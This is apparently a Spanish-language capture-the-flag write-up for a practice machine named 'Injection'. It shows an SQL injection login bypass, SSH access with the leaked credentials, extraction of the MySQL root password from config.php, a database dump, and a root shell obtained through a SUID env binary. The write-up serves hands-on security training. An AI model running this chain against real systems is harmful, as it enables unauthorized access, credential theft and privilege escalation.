# Máquina: Injection

- **Dificultad:** Muy fácil  
- **Tiempo estimado:** 1 hora

---

Ejecutamos un escaneo básico con `nmap`:

```bash
nmap 172.17.0.3
```

Obtenemos que los puertos abiertos son:

- **22/TCP** → SSH  
- **80/TCP** → HTTP

Hacemos un escaneo más detallado sobre estos puertos:

```bash
nmap 172.17.0.3 -sV -p 22,80
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

---


Visitamos la dirección `http://172.17.0.3` en el navegador y encontramos una **página de login**.

Dado que la máquina se llama *Injection*, probamos una inyección SQL simple:

- Usuario: `'admin' or 1=1;`
- Contraseña: (cualquier valor)

**Resultado:** Accedemos exitosamente y vemos el siguiente mensaje:

```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

Tenemos:
- **Usuario:** Dylan
- **Contraseña:** KJSDFG789FGSDF78

---

Probamos a conectarnos con esas credenciales:

```bash
ssh dylan@172.17.0.3
```

**Acceso exitoso.**

---


Intentamos enumerar con `sudo -l`, pero no está disponible.

Explorando el sistema, encontramos un archivo interesante en:

```
/var/www/html/config.php
```

Contenido:

```php
return [
    'db' => [
        'host' => 'localhost',
        'user' => 'root',
        'passwd' => 'paso',
        'dbname' => 'register',
        'options' => [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        ]
    ]
];
```

---

Usamos las credenciales para acceder a la base de datos:

```bash
mysql -u root -ppaso
```

Una vez dentro:

```sql
show databases;
use register;
select * from users;
```

**Resultado:**

```
+----------+------------------+
| username | passwd           |
+----------+------------------+
| dylan    | KJSDFG789FGSDF78 |
+----------+------------------+
```

Ya conocíamos estos datos, pero ahora sabemos que tenemos control total sobre la base de datos.

Probamos a insertar y eliminar usuarios:

```sql
INSERT INTO users VALUES ('prueba','123456');
DELETE FROM users WHERE username='prueba';
```

También podemos exportar la base de datos:

```bash
mysqldump --databases register -u root -ppaso > datos.sql
```

---

Buscamos archivos con el bit SUID activado:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Obtenemos:

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/env
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/gpasswd
```

Estos binarios tienen el **bit SUID de root** activado. Esto significa que, si logramos ejecutar alguno de ellos de forma controlada, **podríamos obtener permisos de root**.

Uno de los más interesantes es `env`. Podemos usarlo para ejecutar `bash` manteniendo los privilegios del propietario (root), gracias al parámetro `-p` que conserva los permisos efectivos:

```bash
/usr/bin/env /bin/bash -p
```

Si funciona correctamente, obtendremos una **shell como root**, y lo podremos comprobar con:

```bash
whoami
```

---

**Si devuelve `root`, la escalada fue exitosa.**












